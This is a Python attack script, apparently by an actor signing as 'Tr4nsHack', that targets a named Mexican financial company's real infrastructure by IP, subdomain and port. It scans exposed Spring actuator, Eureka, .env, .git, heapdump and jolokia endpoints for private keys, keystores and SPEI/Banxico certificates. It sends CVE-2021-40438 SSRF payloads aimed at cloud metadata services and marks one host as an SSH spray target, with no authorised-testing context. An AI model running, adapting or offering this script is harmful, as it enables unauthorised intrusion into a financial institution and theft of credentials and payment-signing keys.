#!/usr/bin/env python3
"""
FISA/FINDEP Infrastructure Probe  -  Tr4nsHack
Target: independencia.com.mx
Focus: PEM/JKS/certificate discovery on live subdomains
Run from VPS only (OPSEC)
"""
import requests, json, sys, urllib3, ssl, socket
from datetime import datetime
urllib3.disable_warnings()

TARGETS = {
    # IP: [subdomains, ports_to_check, notes]
    "35.188.27.26": {
        "subs": ["bigdatainfo", "sifmovil", "despachos"],
        "ports": [80, 443, 8080],
        "notes": "Apache 2.4.6 + PHP 7.2.29 + OpenSSL 1.0.2k CentOS  -  CVE-2021-40438 SSRF",
        "priority": "P0"
    },
    "35.225.39.206": {
        "subs": ["eureka"],
        "ports": [80, 443, 8761],
        "notes": "Eureka Service Registry  -  maps ALL microservices",
        "priority": "P0"
    },
    "34.102.167.192": {
        "subs": ["aheevaqa"],
        "ports": [80, 443, 9443],
        "notes": "Apache + port 9443 (cert-based auth)",
        "priority": "P1"
    },
    "34.121.92.79": {
        "subs": ["aheevauat"],
        "ports": [8484],
        "notes": "Custom Java service",
        "priority": "P1"
    },
    "34.121.26.148": {
        "subs": ["desaaheeva"],
        "ports": [8484],
        "notes": "Custom Java service (dev)",
        "priority": "P1"
    },
    "35.224.15.42": {
        "subs": ["bigdatainfoapi", "bigdatainfoapirest"],
        "ports": [443],
        "notes": "Python 3.11 + Flask 2.0.3",
        "priority": "P2"
    },
    "35.222.97.7": {
        "subs": ["aheevasuper"],
        "ports": [22, 443],
        "notes": "OpenSSH 10.0  -  SSH spray target",
        "priority": "P2"
    },
    "35.222.244.137": {
        "subs": ["analytix", "ppp"],
        "ports": [80, 443],
        "notes": "IIS 8.5 + ASP.NET (Windows in GCP)",
        "priority": "P2"
    },
    "34.72.38.129": {
        "subs": ["sif"],
        "ports": [80, 443, 8080, 8443],
        "notes": "SIF financial system",
        "priority": "P1"
    },
    "34.110.220.98": {
        "subs": ["sif2"],
        "ports": [80, 443],
        "notes": "Node.js + Express + GCP",
        "priority": "P1"
    },
    "34.68.215.6": {
        "subs": ["desarrollo"],
        "ports": [80, 443, 8080, 8443, 9090],
        "notes": "DEVELOPMENT environment",
        "priority": "P0"
    },
    "34.70.22.48": {
        "subs": ["bqqa"],
        "ports": [80, 443, 8080],
        "notes": "QA environment",
        "priority": "P1"
    },
    "34.134.121.78": {
        "subs": ["bqqafront"],
        "ports": [80, 443],
        "notes": "QA frontend",
        "priority": "P2"
    },
    "34.121.170.150": {
        "subs": ["coa"],
        "ports": [80, 443, 8080],
        "notes": "COA service",
        "priority": "P2"
    },
    "34.36.248.67": {
        "subs": ["pao"],
        "ports": [80, 443],
        "notes": "PAO service",
        "priority": "P2"
    },
    "35.202.165.82": {
        "subs": ["mdd"],
        "ports": [80, 443, 8080],
        "notes": "MDD service",
        "priority": "P2"
    },
}

# Paths to check for certs and configs
CERT_PATHS = [
    "/actuator/env",
    "/actuator/configprops",
    "/actuator/health",
    "/actuator/mappings",
    "/actuator/info",
    "/actuator",
    "/eureka/",
    "/eureka/apps",
    "/eureka/apps/delta",
    "/swagger-ui.html",
    "/swagger-ui/",
    "/v2/api-docs",
    "/v3/api-docs",
    "/api-docs",
    "/.env",
    "/.git/config",
    "/.git/HEAD",
    "/config",
    "/configuration",
    "/certs/",
    "/certificates/",
    "/ssl/",
    "/spei/",
    "/pocc/",
    "/health",
    "/info",
    "/status",
    "/",
    "/login",
    "/admin",
    "/console",
    "/management",
    "/jolokia",
    "/jolokia/list",
    "/env",
    "/configprops",
    "/trace",
    "/dump",
    "/metrics",
    "/beans",
    "/loggers",
    "/heapdump",
    "/threaddump",
    "/conditions",
    "/scheduledtasks",
    "/httptrace",
    "/flyway",
    "/liquibase",
    "/shutdown",
]

SSRF_PATHS = [
    # CVE-2021-40438 SSRF via mod_proxy
    "/?unix:AAAA{}|http://169.254.169.254/latest/meta-data/",
    "/?unix:AAAA{}|http://metadata.google.internal/computeMetadata/v1/",
    "/?unix:AAAA{}|http://127.0.0.1:8761/eureka/apps",
    "/?unix:AAAA{}|http://127.0.0.1:8080/actuator/env",
]

results = []

def probe(ip, port, path, hostname=None):
    """Probe a single URL and return status + key headers + body snippet"""
    proto = "https" if port in (443, 8443, 9443) else "http"
    url = f"{proto}://{ip}:{port}{path}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/json,application/xml,*/*",
    }
    if hostname:
        headers["Host"] = f"{hostname}.independencia.com.mx"
    
    try:
        r = requests.get(url, headers=headers, timeout=8, verify=False, allow_redirects=False)
        body = r.text[:500]
        interesting = False
        
        # Check for cert/keystore references
        cert_keywords = [
            "keystore", "truststore", ".pem", ".jks", ".p12", ".pfx",
            "certificate", "certificado", "spei", "pocc", "banxico",
            "private.key", "BEGIN CERTIFICATE", "BEGIN RSA", "BEGIN PRIVATE",
            "ssl.key", "javax.net.ssl", "spring.ssl", "server.ssl",
            "key-store", "trust-store", "key-alias", "key-password",
        ]
        body_lower = body.lower()
        for kw in cert_keywords:
            if kw.lower() in body_lower:
                interesting = True
                break
        
        # Also interesting if 200 on sensitive paths
        if r.status_code == 200 and any(p in path for p in ["/actuator", "/eureka", "/swagger", "/api-docs", "/.env", "/.git", "/jolokia"]):
            interesting = True
            
        result = {
            "url": url,
            "host": hostname,
            "status": r.status_code,
            "size": len(r.text),
            "headers": dict(r.headers),
            "body_snippet": body,
            "interesting": interesting,
        }
        
        status_icon = "[!!!]" if interesting else ("[OK]" if r.status_code < 400 else "[X]")
        print(f"  {status_icon} [{r.status_code}] {url} ({len(r.text)}b) {'*** INTERESTING ***' if interesting else ''}")
        
        if interesting:
            results.append(result)
            
        return result
    except requests.exceptions.Timeout:
        return None
    except Exception as e:
        return None


def extract_ssl_cert(ip, port, hostname):
    """Extract SSL certificate details from a host"""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        with ctx.wrap_socket(socket.socket(), server_hostname=hostname) as s:
            s.settimeout(5)
            s.connect((ip, port))
            cert = s.getpeercert(binary_form=True)
            
            # Parse cert
            import ssl as sslmod
            pem_cert = ssl.DER_cert_to_PEM_cert(cert)
            
            result = {
                "ip": ip,
                "port": port,
                "hostname": hostname,
                "pem_cert": pem_cert,
                "cert_size": len(cert),
            }
            print(f"  [CERT] SSL cert extracted from {hostname}:{port} ({len(cert)} bytes)")
            results.append({"type": "ssl_cert", **result})
            return result
    except Exception as e:
        return None


def main():
    print(f"\n{'='*60}")
    print(f"FISA/FINDEP Infrastructure Probe - {datetime.now().isoformat()}")
    print(f"{'='*60}\n")
    
    # Sort by priority
    sorted_targets = sorted(TARGETS.items(), key=lambda x: x[1]["priority"])
    
    for ip, info in sorted_targets:
        subs = info["subs"]
        ports = info["ports"]
        priority = info["priority"]
        notes = info["notes"]
        
        print(f"\n[{priority}] {ip}  -  {', '.join(s + '.independencia.com.mx' for s in subs)}")
        print(f"    Notes: {notes}")
        print(f"    Ports: {ports}")
        
        # Extract SSL certs first
        for port in ports:
            if port in (443, 8443, 9443):
                for sub in subs:
                    extract_ssl_cert(ip, port, f"{sub}.independencia.com.mx")
        
        # Probe paths
        for port in ports:
            for sub in subs:
                hostname = sub
                print(f"\n  --- {sub}.independencia.com.mx:{port} ---")
                for path in CERT_PATHS:
                    probe(ip, port, path, hostname)
                
                # SSRF only on Apache 2.4.6 target
                if ip == "35.188.27.26" and port == 8080:
                    print(f"\n  --- SSRF probes (CVE-2021-40438) ---")
                    for spath in SSRF_PATHS:
                        probe(ip, port, spath, hostname)
    
    # Save results
    outfile = f"fisa_probe_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(outfile, 'w') as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\n{'='*60}")
    print(f"Interesting findings: {len(results)}")
    print(f"Saved to: {outfile}")
    print(f"{'='*60}")


if __name__ == "__main__":
    main()
